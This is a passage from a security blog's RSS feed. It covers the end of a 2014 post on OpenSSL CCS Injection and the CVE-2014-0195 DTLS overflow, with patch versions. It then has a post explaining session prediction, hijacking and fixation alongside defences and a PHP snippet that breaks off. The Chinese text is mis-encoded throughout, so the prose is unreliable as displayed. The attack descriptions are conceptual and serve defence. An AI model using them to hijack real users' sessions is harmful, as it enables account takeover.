&lt;p&gt;å¦å¤–ï¼Œè‹¥ä½¿ç”¨è€…å¸¸ç”¨åˆ°ä¸€äº›åŠ å¯†é€£ç·šæœå‹™ï¼Œä¾‹å¦‚ VPNï¼Œè«‹è‡ªè¡Œæ³¨æ„æ‰€ä½¿ç”¨è»Ÿé«”æ˜¯å¦ä½¿ç”¨ OpenSSLï¼Œä»¥å…å—åˆ° CCS Injection çš„å½±éŸ¿ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/logo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/logo.png&quot; alt=&quot;CCS Injection Vulnerability&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æœ€å¾Œèªªå€‹é¡Œå¤–è©±ï¼ŒåŸä¾†ç¾åœ¨ç™¼è¡¨æ¼æ´é‚„è¦ç‚ºæ¼æ´å‡ºå¼µåœ–ï¼Œåœ¨ Hacker News åŸè¨è«–ä¸²çš„&lt;a href=&quot;https://news.ycombinator.com/item?id=7851357#up_7851735&quot;&gt;é€™ç¯‡å›æ‡‰&lt;/a&gt;ï¼Œå°±æœ‰äººèªªï¼šã€é€™å€‹æ¼æ´æœ‰ logo å—ï¼Ÿå¦‚æœæ²’æœ‰æˆ‘å°±ä¸æ‰“ç®—èªçœŸçœ‹å¾…å®ƒï¼ã€XD&lt;/p&gt;

&lt;h3 id=&quot;cve-2014-0195-dtls-arbitrary-code-execution&quot;&gt;CVE-2014-0195 (DTLS arbitrary code execution)&lt;/h3&gt;

&lt;h4 id=&quot;èªªæ˜-1&quot;&gt;èªªæ˜&lt;/h4&gt;

&lt;p&gt;OpenSSL åœ¨è™•ç† &lt;a href=&quot;http://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security&quot;&gt;DTLS&lt;/a&gt; è¨Šæ¯ä¸Šï¼Œç‚ºäº†é¿å… IP fragmentationï¼Œæ‰€ä»¥åšäº†ä¸€äº›è™•ç†æ©Ÿåˆ¶ï¼Œé€™å€‹è™•ç†æ©Ÿåˆ¶ä¸¦æ²’æœ‰å¥½å¥½é©—è­‰ DLTS ClientHello ä¸­çš„ fragment é•·åº¦ï¼ˆåš´æ ¼ä¾†èªªæ˜¯åœ¨æ­£ç¢ºçš„ä½ç½®åšé©—è­‰ï¼‰ï¼Œè‹¥æ”»æ“Šè€…ç™¼é€ä¸€å€‹å¾ˆé•·çš„ fragmentï¼Œèƒ½é€ æˆç·©è¡å€æº¢ä½æ”»æ“Šã€‚æ›´å¤šçš„ç´°ç¯€è«‹åƒè€ƒ&lt;a href=&quot;http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002#.U5FqnvmSyD4&quot;&gt;é€™ç¯‡æ–‡ç« &lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æ¯”è¼ƒæœ‰è¶£çš„æ˜¯é‚£æ®µå‡ºå•é¡Œçš„ç¨‹å¼ç¢¼æ˜¯ä¸€ä½æœ‰åå¾·åœ‹å·¥ç¨‹å¸« Robin Seggelmann å¯«çš„ï¼Œæœ‰åçš„é»åœ¨æ–¼ä¸Šæ¬¡éå¸¸åš´é‡çš„ &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; äº‹ä»¶ä¹Ÿæ˜¯ä»–å¯«çš„ code XD&lt;/p&gt;

&lt;h4 id=&quot;èª°æ‡‰è©²æ³¨æ„-1&quot;&gt;èª°æ‡‰è©²æ³¨æ„&lt;/h4&gt;

&lt;p&gt;ä½¿ç”¨ OpenSSL ä¸”æœ‰ç”¨åˆ° DTLS çš„æœå‹™æä¾›è€…ï¼Œé€šå¸¸æ˜¯ VoIPã€WebRTCã€VPN é€™é¡æœå‹™ï¼Œé€™å€‹é¢¨éšªæœ‰å¯èƒ½æœƒé€ æˆä¼ºæœå™¨è¢«å…¥ä¾µã€‚&lt;/p&gt;

&lt;h3 id=&quot;ä¿®è£œ&quot;&gt;ä¿®è£œ&lt;/h3&gt;

&lt;p&gt;é™¤äº†ä¸Šé¢æ‰€æåŠå…©å€‹åš´é‡é¢¨éšªï¼Œé€™æ¬¡çš„æ›´æ–°ä¹ŸåŒæ™‚ä¿®å¾©äº†å¹¾å€‹ DOS çš„å¼±é»ï¼Œå¼·çƒˆå»ºè­°ä¼ºæœå™¨ç«¯æ›´æ–°ã€‚
è«‹ç¢ºèª OpenSSL å·²ç¶“æ›´æ–°åˆ°ä¸‹é¢ç‰ˆæœ¬ï¼Œä¸¦ä¸”æœ‰é‡æ–°å•Ÿå‹•è®“å…¶ç”Ÿæ•ˆã€‚&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;OpenSSL 0.9.8za&lt;/li&gt;
  &lt;li&gt;OpenSSL 1.0.0m&lt;/li&gt;
  &lt;li&gt;OpenSSL 1.0.1h&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ›´æ–°è³‡è¨Šä¾æ“šæ‰€ç”¨çš„ç³»çµ±åˆ†åˆ¥å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.ubuntu.com/usn/usn-2232-1/&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lists.debian.org/debian-security-announce/2014/msg00129.html&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.freebsd.org/security/advisories/FreeBSD-SA-14:14.openssl.asc&quot;&gt;FreeBSD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lists.centos.org/pipermail/centos-announce/2014-June/020344.html&quot;&gt;CentOS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0624.html&quot;&gt;Red Hat 5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0625.html&quot;&gt;Red Hat 6&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://aws.amazon.com/jp/security/security-bulletins/openssl-security-advisory/&quot;&gt;Amazon Linux AMI&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å°çµ&quot;&gt;å°çµ&lt;/h3&gt;

&lt;p&gt;é€™æ¬¡ OpenSSL åšäº†æ•¸å€‹å®‰å…¨æ€§çš„æ›´æ–°ï¼Œé›–ç„¶ä¸è‹¥&lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;ä¹‹å‰ Heartbleed é‚£éº¼åš´é‡&lt;/a&gt;ï¼Œä½†å»ä¹Ÿè®“ä½¿ç”¨è€…æš´éœ²åœ¨é¢¨éšªä¸­ã€‚å»ºè­°æœ‰ä½¿ç”¨ OpenSSL éƒ½æ‡‰è©²æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œå°¤å…¶æ˜¯ä¸€äº›å¤§å‹çš„éŠ€è¡ŒåŠé‡‘æµæœå‹™ï¼Œæ›´æ‡‰å„˜é€Ÿæ›´æ–°ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection/</link>
                <guid>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection</guid>
                <pubDate>Mon, 09 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HTTP Session æ”»æ“Šèˆ‡é˜²è­·</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;å¤§å®¶é‚„è¨˜å¾—å››æœˆä»½çš„ &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; äº‹ä»¶å—ï¼Ÿç•¶æ™‚é™¤äº†ç¶²ç«™æœ¬èº«ä»¥å¤–ï¼Œå—å®³æœ€åš´é‡çš„å°±å±¬ VPN Server äº†ã€‚åœ‹å…§å¤–ä¸å°‘é§­å®¢ä¸çœ ä¸ä¼‘åˆ©ç”¨ Heartbleed æ¼æ´ç«Šå– VPN Server çš„ç®¡ç†è€… Session Cookieï¼Œé‹æ°£å¥½çš„è©±å°±å¯ä»¥ç›´æ¥ç™»å…¥å¤§ä¼æ¥­çš„å…§ç¶²ã€‚&lt;/p&gt;

&lt;p&gt;ä½†æ˜¯ï¼Œå…¶å¯¦é€™æ¨£çš„é¢¨éšªæ˜¯å¯ä»¥é¿å…çš„ï¼Œä»Šå¤©æˆ‘å€‘ä»¥é–‹ç™¼è€…çš„è§’åº¦ä¾†è«‡è«‡ Session çš„æ”»æ“Šèˆ‡é˜²è­·ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ä»€éº¼æ˜¯-sessionä»€éº¼æ˜¯-cookie&quot;&gt;ä»€éº¼æ˜¯ Sessionï¼Ÿä»€éº¼æ˜¯ Cookieï¼Ÿ&lt;/h3&gt;

&lt;p&gt;åœ¨è«‡ Session ä¹‹å‰ï¼Œæˆ‘å€‘è¦å…ˆç­è§£ Cookieã€‚ä½ çŸ¥é“ç¶²ç«™æ˜¯å¦‚ä½•è¾¨è­˜æˆ‘å€‘çš„èº«ä»½å—ï¼Ÿç‚ºä»€éº¼æˆ‘å€‘è¼¸å…¥å®Œå¸³è™Ÿå¯†ç¢¼ä¹‹å¾Œï¼Œç¶²ç«™å°±çŸ¥é“æˆ‘å€‘æ˜¯èª°å‘¢ï¼Ÿå°±æ˜¯åˆ©ç”¨ Cookieã€‚Cookie æ˜¯ç¶²ç«™åœ¨ç€è¦½å™¨ä¸­å­˜æ”¾çš„è³‡æ–™ï¼Œå…§å®¹åŒ…æ‹¬ä½¿ç”¨è€…åœ¨ç¶²ç«™ä¸Šçš„åå¥½è¨­å®šã€æˆ–è€…æ˜¯ç™»å…¥çš„ Session IDã€‚ç¶²ç«™åˆ©ç”¨ Session ID ä¾†è¾¨èªè¨ªå®¢çš„èº«ä»½ã€‚&lt;/p&gt;

&lt;p&gt;Cookie æ—¢ç„¶å­˜æ”¾åœ¨ Client ç«¯ï¼Œé‚£å°±æœ‰è¢«ç«Šå–çš„é¢¨éšªã€‚ä¾‹å¦‚é€é &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scriptingï¼ˆè·¨ç«™è…³æœ¬æ”»æ“Šï¼Œåˆç¨± XSSï¼‰&lt;/a&gt;ï¼Œæ”»æ“Šè€…å¯ä»¥è¼•æ˜“ç«Šå–å—å®³è€…çš„ Cookieã€‚å¦‚æœ Cookie è¢«å·èµ°äº†ï¼Œä½ çš„èº«ä»½å°±è¢«ç«Šå–äº†ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥ç”¨ä¸€å€‹è­¬å–»ä¾†è¡¨ç¤ºï¼šä½ åŠ å…¥äº†ä¸€å€‹ç§˜å¯†ä¿±æ¨‚éƒ¨ï¼Œå¡«å¯«å®Œæœƒå“¡è³‡æ–™å¾Œï¼Œå¾—åˆ°äº†ä¸€å¼µæœƒå“¡å¡ã€‚ä¹‹å¾Œåªè¦æ†‘é€™å¼µæœƒå“¡å¡ï¼Œå°±å¯ä»¥é€²å…¥é€™å€‹ä¿±æ¨‚éƒ¨ã€‚ä½†æ˜¯éš”å¤©ï¼Œä½ çš„æœƒå“¡å¡æ‰äº†ã€‚æ’¿èµ°ä½ æœƒå“¡å¡çš„äººï¼Œå°±å¯ä»¥ç”¨ä½ çš„æœƒå“¡å¡é€²å…¥é€™å€‹ç§˜å¯†ä¿±æ¨‚éƒ¨ï¼Œå› ç‚ºæœƒå“¡å¡ä¸Šæ²’æœ‰ä½ çš„ç…§ç‰‡æˆ–æ˜¯å…¶ä»–è¶³ä»¥è¾¨è­˜èº«åˆ†çš„è³‡è¨Šã€‚é€™å°±åƒæ˜¯ä¸€å€‹æœƒå“¡ç¶²ç«™ï¼Œæˆ‘å€‘ç”³è«‹äº†ä¸€å€‹å¸³è™Ÿï¼ˆå¡«å¯«æœƒå“¡è³‡æ–™åŠ å…¥ä¿±æ¨‚éƒ¨ï¼‰ï¼Œè¼¸å…¥å¸³è™Ÿå¯†ç¢¼ç™»å…¥ä¹‹å¾Œï¼Œå¾—åˆ°ä¸€çµ„ Cookieï¼Œå…¶ä¸­æœ‰ Session ID ä¾†è¾¨è­˜ä½ çš„èº«åˆ†ï¼ˆé€éæœƒå“¡å¡ä¾†è¾¨è­˜èº«åˆ†ï¼‰ã€‚ä»Šå¤©å¦‚æœ Cookie è¢«å·èµ°äº†ï¼ˆæœƒå“¡å¡è¢«æ’¿èµ°äº†ï¼‰ï¼Œåˆ¥äººå°±å¯ä»¥ç”¨ä½ çš„å¸³è™Ÿä¾†ç™»å…¥ç¶²ç«™ï¼ˆåˆ¥äººç”¨ä½ çš„æœƒå“¡å¡é€²å…¥ä¿±æ¨‚éƒ¨ï¼‰ã€‚&lt;/p&gt;

&lt;p&gt;Session æ”»æ“Šæ‰‹æ³•æœ‰ä¸‰ç¨®ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;çŒœæ¸¬ Session ID (Session Prediction)&lt;/li&gt;
  &lt;li&gt;ç«Šå– Session ID (Session Hijacking)&lt;/li&gt;
  &lt;li&gt;å›ºå®š Session ID (Session Fixation)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;æˆ‘å€‘ä»¥ä¸‹ä¸€ä¸€ä»‹ç´¹ã€‚&lt;/p&gt;

&lt;h4 id=&quot;session-prediction-çŒœæ¸¬-session-id&quot;&gt;Session Prediction (çŒœæ¸¬ Session ID)&lt;/h4&gt;

&lt;p&gt;Session ID å¦‚åŒæˆ‘å€‘å‰é¢æ‰€èªªçš„ï¼Œå°±å¦‚åŒæ˜¯æœƒå“¡å¡çš„ç·¨è™Ÿã€‚åªè¦çŸ¥é“ Session IDï¼Œå°±å¯ä»¥æˆç‚ºé€™å€‹ä½¿ç”¨è€…ã€‚å¦‚æœ Session ID çš„é•·åº¦ã€è¤‡é›œåº¦ã€é›œäº‚åº¦ä¸å¤ ï¼Œå°±èƒ½å¤ è¢«æ”»æ“Šè€…çŒœæ¸¬ã€‚æ”»æ“Šè€…åªè¦å¯«ç¨‹å¼ä¸æ–·æš´åŠ›è¨ˆç®— Session IDï¼Œå°±æœ‰æ©Ÿæœƒå¾—åˆ°æœ‰æ•ˆçš„ Session ID è€Œç«Šå–ä½¿ç”¨è€…å¸³è™Ÿã€‚&lt;/p&gt;

&lt;p&gt;åˆ†æ Session ID çš„å·¥å…·å¯ä»¥ç”¨ä»¥ä¸‹å¹¾ç¨®&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project&quot;&gt;OWASP WebScarab&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lcamtuf.coredump.cx/soft/stompy.tgz&quot;&gt;Stompy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;è§€å¯Ÿ Session ID çš„äº‚æ•¸åˆ†å¸ƒï¼Œå¯ä»¥äº†è§£æ˜¯å¦èƒ½å¤ æ¨å‡ºè¦å¾‹ã€çŒœæ¸¬æœ‰æ•ˆçš„ Session IDã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot; alt=&quot;åˆ†æ Session ID&quot; title=&quot;åˆ†æ Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ref: &lt;a href=&quot;http://programming4.us/security/3950.aspx&quot;&gt;http://programming4.us/security/3950.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;é˜²è­·æªæ–½&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ä½¿ç”¨ Session ID åˆ†æç¨‹å¼é€²è¡Œåˆ†æï¼Œè©•ä¼°æ˜¯å¦ç„¡æ³•è¢«é æ¸¬ã€‚å¦‚æœæ²’æœ‰ 100% çš„æŠŠæ¡è‡ªå·±æ’°å¯«çš„ Session ID ç”¢ç”Ÿæ©Ÿåˆ¶æ˜¯å®‰å…¨çš„ï¼Œä¸å¦¨ä½¿ç”¨å…§å»ºçš„ Session ID ç”¢ç”Ÿ functionï¼Œé€šå¸¸éƒ½æœ‰ä¸€å®šç¨‹åº¦çš„å®‰å…¨ã€‚&lt;/p&gt;

&lt;h4 id=&quot;session-hijacking-ç«Šå–-session-id&quot;&gt;Session Hijacking (ç«Šå– Session ID)&lt;/h4&gt;

&lt;p&gt;ç«Šå– Session ID æ˜¯æœ€å¸¸è¦‹çš„æ”»æ“Šæ‰‹æ³•ã€‚æ”»æ“Šè€…å¯ä»¥åˆ©ç”¨å¤šç¨®æ–¹å¼ç«Šå– Cookie ç²å– Session IDï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;è·¨ç«™è…³æœ¬æ”»æ“Š (&lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scripting (XSS)&lt;/a&gt;)ï¼šåˆ©ç”¨ XSS æ¼æ´ç«Šå–ä½¿ç”¨è€… Cookie&lt;/li&gt;
  &lt;li&gt;ç¶²è·¯ç«Šè½ï¼šä½¿ç”¨ ARP Spoofing ç­‰æ‰‹æ³•ç«Šè½ç¶²è·¯å°åŒ…ç²å– Cookie&lt;/li&gt;
  &lt;li&gt;é€é Referer å–å¾—ï¼šè‹¥ç¶²ç«™å…è¨± Session ID ä½¿ç”¨ URL å‚³éï¼Œä¾¿å¯èƒ½å¾ Referer å–å¾— Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ç«Šå–åˆ©ç”¨çš„æ–¹å¼å¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;å—å®³è€…å·²ç¶“ç™»å…¥ç¶²ç«™ä¼ºæœå™¨ï¼Œä¸¦ä¸”å–å¾— Session IDï¼Œåœ¨é€£ç·šéç¨‹ä¸­æ”»æ“Šè€…ç”¨ç«Šè½çš„æ–¹å¼ç²å–å—å®³è€… Session IDã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot; alt=&quot;ç«Šå– Session ID&quot; title=&quot;ç«Šå– Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ”»æ“Šè€…ç›´æ¥ä½¿ç”¨ç«Šå–åˆ°çš„ Session ID é€è‡³ä¼ºæœå™¨ï¼Œå½é€ å—å®³è€…èº«åˆ†ã€‚è‹¥ä¼ºæœå™¨æ²’æœ‰æª¢æŸ¥ Session ID çš„ä½¿ç”¨è€…èº«åˆ†ï¼Œå‰‡å¯ä»¥è®“æ”»æ“Šè€…å¾—é€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot; alt=&quot;å½é€  Session ID&quot; title=&quot;å½é€  Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;é˜²è­·æªæ–½&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç¦æ­¢å°‡ Session ID ä½¿ç”¨ URL (GET) æ–¹å¼ä¾†å‚³é&lt;/li&gt;
  &lt;li&gt;è¨­å®šåŠ å¼·å®‰å…¨æ€§çš„ Cookie å±¬æ€§ï¼šHttpOnly (ç„¡æ³•è¢« JavaScript å­˜å–)&lt;/li&gt;
  &lt;li&gt;è¨­å®šåŠ å¼·å®‰å…¨æ€§çš„ Cookie å±¬æ€§ï¼šSecure (åªåœ¨ HTTPS å‚³éï¼Œè‹¥ç¶²ç«™ç„¡ HTTPS è«‹å‹¿è¨­å®š)&lt;/li&gt;
  &lt;li&gt;åœ¨éœ€è¦æ¬Šé™çš„é é¢è«‹ä½¿ç”¨è€…é‡æ–°è¼¸å…¥å¯†ç¢¼&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;session-fixation-å›ºå®š-session-id&quot;&gt;Session Fixation (å›ºå®š Session ID)&lt;/h4&gt;

&lt;p&gt;æ”»æ“Šè€…èª˜ä½¿å—å®³è€…ä½¿ç”¨ç‰¹å®šçš„ Session ID ç™»å…¥ç¶²ç«™ï¼Œè€Œæ”»æ“Šè€…å°±èƒ½å–å¾—å—å®³è€…çš„èº«åˆ†ã€‚&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æ”»æ“Šè€…å¾ç¶²ç«™å–å¾—æœ‰æ•ˆ Session ID&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ç¤¾äº¤å·¥ç¨‹ç­‰æ‰‹æ³•èª˜ä½¿å—å®³è€…é»é¸é€£çµï¼Œä½¿ç”¨è©² Session ID ç™»å…¥ç¶²ç«™&lt;/li&gt;
  &lt;li&gt;å—å®³è€…è¼¸å…¥å¸³è™Ÿå¯†ç¢¼æˆåŠŸç™»å…¥ç¶²ç«™&lt;/li&gt;
  &lt;li&gt;æ”»æ“Šè€…ä½¿ç”¨è©² Session IDï¼Œæ“ä½œå—å®³è€…çš„å¸³è™Ÿ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot; alt=&quot;Session Fixation&quot; title=&quot;Session Fixation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;é˜²è­·æªæ–½&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åœ¨ä½¿ç”¨è€…ç™»å…¥æˆåŠŸå¾Œï¼Œç«‹å³æ›´æ› Session IDï¼Œé˜²æ­¢æ”»æ“Šè€…æ“æ§ Session ID çµ¦äºˆå—å®³è€…ã€‚&lt;/li&gt;
  &lt;li&gt;ç¦æ­¢å°‡ Session ID ä½¿ç”¨ URL (GET) æ–¹å¼ä¾†å‚³é&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;session-é˜²è­·&quot;&gt;Session é˜²è­·&lt;/h3&gt;

&lt;p&gt;é‚£è¦æ€éº¼é˜²ç¯„æ”»æ“Šå‘¢ï¼Ÿç•¶ç„¶æœƒæœ‰äººèªªï¼Œæœƒå“¡å¡ä¸è¦æ‰ä¸å°±æ²’äº‹äº†å—ï¼Ÿç•¶ç„¶æˆ‘å€‘æ²’è¾¦æ³•ç¢ºä¿ç”¨æˆ¶ä¸æœƒå› ç‚ºå„ç¨®æ–¹å¼å°è‡´ Cookie é­ç«Šï¼ˆXSSã€æƒ¡æ„ç¨‹å¼ç­‰ï¼‰ï¼Œå› æ­¤æœ€å¾Œä¸€é“é˜²ç·šå°±æ˜¯ç¶²ç«™çš„ Session ä¿è­·ã€‚ä¸€å¼µæœƒå“¡å¡ä¸Šå¦‚æœæ²’æœ‰ä»»ä½•å¯è­˜åˆ¥çš„å€‹äººè³‡æ–™ï¼Œç•¶ç„¶ä»»ä½•äººæ’¿å»äº†éƒ½å¯ä»¥ç”¨ã€‚å¦‚æœä¸Šé¢æœ‰ç…§ç‰‡è·Ÿç°½åå‘¢ï¼Ÿå·èµ°æœƒå“¡å¡çš„äººåœ¨é€²å…¥ä¿±æ¨‚éƒ¨çš„æ™‚å€™ï¼Œåœ¨é–€å£å°±æœƒå› ç‚ºç…§ç‰‡è·Ÿæœ¬äººä¸ç¬¦è€Œè¢«æ“‹ä¸‹ä¾†ã€‚Session ä¿è­·ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œæ€éº¼è®“æˆ‘å€‘çš„ Session ä¿è­·æ©Ÿåˆ¶ä¹Ÿèƒ½è¾¨è­˜èº«åˆ†å‘¢ï¼Ÿç­”æ¡ˆæ˜¯åˆ©ç”¨æ¯å€‹ä½¿ç”¨è€…ç‰¹æœ‰çš„è­˜åˆ¥è³‡è¨Šã€‚&lt;/p&gt;

&lt;p&gt;æ¯å€‹ä½¿ç”¨è€…åœ¨ç™»å…¥ç¶²ç«™çš„æ™‚å€™ï¼Œæˆ‘å€‘å¯ä»¥ç”¨æ¯å€‹äººç‰¹æœ‰çš„è­˜åˆ¥è³‡è¨Šä¾†ç¢ºèªèº«åˆ†ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ä¾†æº IP ä½å€&lt;/li&gt;
  &lt;li&gt;ç€è¦½å™¨ User-Agent&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¦‚æœåœ¨åŒä¸€å€‹ Session ä¸­ï¼Œä½¿ç”¨è€…çš„ IP æˆ–è€… User-Agent æ”¹è®Šäº†ï¼Œæœ€å®‰å…¨çš„ä½œæ³•å°±æ˜¯æŠŠé€™å€‹ Session æ¸…é™¤ï¼Œè«‹ä½¿ç”¨è€…é‡æ–°ç™»å…¥ã€‚é›–ç„¶ä½¿ç”¨è€…å¯èƒ½å› ç‚º IP æ›´æ›ã€Proxy ç­‰å› ç´ å°è‡´è¢«å¼·åˆ¶ç™»å‡ºï¼Œä½†ç‚ºäº†å®‰å…¨æ€§ï¼Œä¾¿åˆ©æ€§å¿…é ˆè¦èˆ‡ä¹‹å–æ¨ã€‚ä»¥ PHP ç‚ºä¾‹ï¼Œæˆ‘å€‘å¯ä»¥é€™æ¨£æ’°å¯«ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;HTTP_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_USER_AGENT&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;nb&quot;&gt;session_destroy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_regenerate_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;LAST_REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
